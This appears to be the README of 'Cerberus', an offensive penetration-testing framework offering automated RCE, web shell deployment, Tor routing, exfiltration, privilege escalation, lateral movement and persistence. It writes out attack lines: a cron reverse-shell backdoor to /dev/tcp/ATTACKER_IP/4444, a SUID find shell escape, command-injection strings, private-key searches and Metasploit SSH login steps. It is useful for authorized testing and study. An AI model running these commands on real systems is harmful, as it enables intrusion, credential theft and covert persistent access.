# Cerberus Security Assessment & Exploitation
![Cerberus Banner](https://github.com/user-attachments/assets/ad22fcf5-2fcb-4592-8f5f-79fea1975008)

<img width="1024" height="1536" alt="Cerberus Interface" src="https://github.com/user-attachments/assets/b193a2ab-0f4c-4f92-9dc5-c6585df29f5b" />

## Overview

Cerberus is a comprehensive, intelligent security assessment framework featuring advanced RCE exploitation, real command execution, and automated post-exploitation capabilities. This enhanced version represents a complete evolution from previous iterations with sophisticated exploitation techniques and intelligent vulnerability assessment.

**Disclaimer: This tool is for authorized security testing, educational purposes, and professional penetration testing only.**

## Installation

```bash
git clone https://github.com/ekomsSavior/Cerberus.git
cd Cerberus

# Install dependencies

sudo apt update && sudo apt install tor

pip install requests pysocks urllib3 readline --break-system-packages

```

![Screenshot_2025-11-04_02_21_16](https://github.com/user-attachments/assets/def699c1-3a3c-476b-9e8b-0891f173c14c)


## Usage

always start tor first

```bash
sudo systemctl start tor@default
```

then run Cerberus

```bash
sudo python3 cerberus.py
```

The framework operates in interactive mode, guiding you through:

1. **Target Specification**: IP/hostname and port configuration
2. **Scan Type Selection**: Quick scan, full assessment, or specific module execution
3. **TOR Integration**: Optional anonymous operations
4. **Automated Exploitation**: Intelligent vulnerability detection and exploitation
5. **Post-Exploitation**: Interactive menu for continued access and data exfiltration

## Advanced Exploitation Modules

### WebShellDeployer
- **PHP Shell Deployment**: Multiple shell types (basic, advanced, obfuscated, mini, base64)
- **Deployment Methods**: File upload, file write, log poisoning, template injection
- **ASP/X Shells**: Windows-specific web shell deployment
- **Automated Testing**: Shell functionality verification

### FrameworkExploiter
- **Spring RCE**: Multiple CVE exploitation including Spring4Shell
- **Laravel Exploitation**: Debug mode RCE, token unserialization attacks
- **WordPress Targeting**: Vulnerable plugin detection and exploitation
- **Authentication Bypass**: Framework-specific credential testing

### IntelligentRCEExploiter
- **Multi-Vector Attacks**: JSON-RPC, REST API, command injection, deserialization
- **Template Injection**: SSTI, Jinja2, Twig exploitation
- **Advanced Command Injection**: Windows and Linux payload sets
- **Intelligent Detection**: Success validation and response analysis

### ServiceSpecificExploiter
- **Web Service Attacks**: Directory traversal, file inclusion, admin panel discovery
- **FTP Exploitation**: Anonymous access testing, credential brute forcing
- **SSH Analysis**: Common credential testing and service enumeration
- **DNS Attacks**: Zone transfer testing, recursion verification
- **SMB/RDP**: Anonymous share discovery, service vulnerability assessment

## Command Execution Engine

### Execution Methods
- **Command Injection**: `;command;`, `|command`, `` `command` ``, `$(command)`, `||command`, `&&command`
- **PHP Code Execution**: `system()`, `exec()`, `shell_exec()`, `passthru()`, backticks, base64 encoding
- **Template Injection**: Jinja2, Smarty, Twig template engine exploitation
- **Deserialization Attacks**: PHP, Java, Python object injection
- **SSRF Exploitation**: Internal service access and command execution

### Parameter Testing
Comprehensive parameter testing across:
- `ip`, `host`, `cmd`, `command`, `exec`, `system`, `query`, `input`
- `data`, `username`, `password`, `file`, `path`, `url`, `page`, `template`

## Privilege Escalation Framework

### SUID Binary Exploitation
- **Automated Detection**: `find / -perm -4000` analysis
- **Binary Exploitation**: bash, dash, find, nmap, vim, less, more, awk, perl, python
- **Exploit Payloads**: Context-aware exploitation commands for each binary

### Sudo Misconfiguration
- **Permission Enumeration**: `sudo -l` analysis and exploitation
- **Pattern Recognition**: Automated detection of exploitable sudo configurations
- **Privilege Escalation**: Root access through misconfigured sudo rights

### System Analysis
- **Cron Job Examination**: `/etc/cron*`, `/var/spool/cron` analysis
- **Capability Discovery**: `getcap -r /` capability enumeration
- **Writable File Identification**: System file permission analysis
---

# Post-Exploitation Menu

![20868D7B-209C-4318-B2FF-14A7E0FB83C5](https://github.com/user-attachments/assets/fbd79a85-23bb-4e78-a773-7e65dca50866)

### **Interactive Features That Work Immediately**

#### **Interactive Shell** 
**Status: FULLY FUNCTIONAL**
- Once RCE is established, you get a fully working shell interface
- Execute any system commands directly on the compromised target
- Perfect for real-time exploration and manual testing

#### **Data Exfiltration**
**Status: FULLY FUNCTIONAL**
- Automatically extracts and saves sensitive system files:
  - `/etc/passwd`, `/etc/hosts`, `/proc/version`
  - Network configurations and system information
- Creates timestamped reports with all extracted data
- Files saved as: `exfiltrated_data_[target]_[timestamp].txt`

#### **System Intelligence Gathering**
**Status: FULLY FUNCTIONAL**
- Live system reconnaissance:
  - Kernel information: `uname -a`
  - CPU and memory details: `cat /proc/cpuinfo`, `free -h`
  - Disk usage: `df -h`
  - Running processes: `ps aux`
  - Current user context: `whoami && id`

#### **Network Reconnaissance**
**Status: CONDITIONAL (Depends on target system)**
- Internal network mapping:
  - Network interfaces: `ifconfig || ip addr`
  - Routing tables: `route -n || ip route`
  - ARP tables and active connections
- **Note**: Requires basic networking tools on target system

### **Advanced Features Requiring User Action**

#### **Privilege Escalation**
**Detection: FULLY FUNCTIONAL | Exploitation: GUIDED**
- **What Works Automatically**:
  - Finds all SUID binaries: `find / -perm -4000`
  - Checks sudo permissions: `sudo -l`
  - Identifies cron jobs and capabilities
- **What Requires Manual Intervention**:
  - When exploitable binaries are found (bash, find, nmap, vim, etc.), Cerberus provides the exploitation commands
  - **You must manually execute** the provided exploit commands in the interactive shell
  - Example: If `/usr/bin/find` is SUID, use: `find . -exec /bin/sh \; -quit`

#### **Lateral Movement**
**Status: RECONNAISSANCE ONLY**
- **What Cerberus Provides**:
  - Finds potential lateral movement vectors:
    - SSH keys: `find /home /root -name '.ssh' -type d`
    - Private keys: `find / -name '*.pem' -o -name 'id_rsa'`
    - Configuration files and credentials
- **What You Need to Do**:
  - **Manually use** discovered SSH keys or credentials
  - **Set up** SSH connections to other systems manually
  - **Configure** tools like Metasploit or custom scripts for actual lateral movement

#### **Persistence Mechanisms**
**Status: TEMPLATE-BASED**
- **What Cerberus Provides**:
  - Persistence templates and concepts:
    - Cron job backdoors
    - Reverse shell persistence
    - Service-based backdoors
- **What You Need to Do**:
  - **Replace placeholders** in persistence commands:
    ```bash
    # CHANGE THIS: Cerberus provides template
    */5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
    
    # TO THIS: You manually update with your IP
    */5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
    ```
  - **Manually execute** persistence commands in the interactive shell
  - **Verify** backdoors are properly installed and working

###  **User Workflow for Advanced Features**

#### For Privilege Escalation:
1. Run privilege escalation detection in Cerberus
2. **Copy** the provided exploit commands
3. **Paste and execute** them in the interactive shell
4. **Verify** root access with `whoami`

#### For Lateral Movement:
1. Use Cerberus to find SSH keys and credentials
2. **Manually copy** discovered keys to your attacker machine
3. **Use standard tools** for lateral movement:
   ```bash
   # Manual SSH with discovered key
   ssh -i discovered_key.pem user@internal_ip
   
   # Or use in Metasploit
   use auxiliary/scanner/ssh/ssh_login
   set RHOSTS internal_subnet
   set USERNAME discovered_user
   set KEY_PATH discovered_key.pem
   ```

#### For Persistence:
1. Get persistence templates from Cerberus
2. **Customize** with your actual IP and ports
3. **Execute manually** in the interactive shell
4. **Test** persistence mechanisms from your machine

### **Quick Reference - What Works Out of the Box**

| Feature           | Status| User Action Required     |
|-------------------|-------|--------------------------|
| Interactive Shell |  Full | None                     |
| Data Exfiltration |  Full | None                     |
| System Recon      |  Full | None                     |
| Network Recon     | Condt | None (if tools exist)    |
| PrivEsc Detection |  Full | None                     |
| PrivEsc Exploit   |Guided | Manual command execution |
| Lateral Mvmt      |  Full | Manual exploitation      |
| Prstst tmplt      | Basic | Full customization       |

### **Pro Tips for Maximum Effectiveness**

1. **Start with the interactive shell** - it's the most reliable feature
2. **Use data exfiltration first** to understand the target environment
3. **For privilege escalation**: Copy Cerberus findings and use them with tools like LinPEAS or manual exploitation
4. **For lateral movement**: Combine Cerberus findings with standard penetration testing tools
5. **Always verify** persistence mechanisms work before relying on them

---

## Output and Reporting

### Comprehensive Reporting
- **Text Reports**: Detailed assessment findings with timestamps and evidence
- **Structured Data**: Machine-readable output for automation and analysis
- **Evidence Archives**: ZIP files containing extracted sensitive data and configurations
- **Execution Logs**: Complete exploitation timeline and methodology

### Evidence Management
- **Automated Archiving**: Structured evidence collection and preservation
- **Credential Storage**: Secure password and configuration data management
- **SSH Key Repository**: Extracted SSH keys and authorized_keys files
- **Sensitive Data**: Protected storage of exfiltrated information

## Legal and Ethical Use

### Authorized Usage Only
This framework is intended exclusively for:
- Authorized penetration testing with written permission

**Cerberus Security Assessment Framework v5.1 - Advanced Intelligence for Modern Security Testing**

<img width="1024" height="1536" alt="Cerberus Demonstration" src="https://github.com/user-attachments/assets/592c1c01-ff00-44b1-9061-0039ac3891c6" />

![Cerberus Architecture](https://github.com/user-attachments/assets/03ab0d16-b536-4dac-8bfa-836526a17fb0)
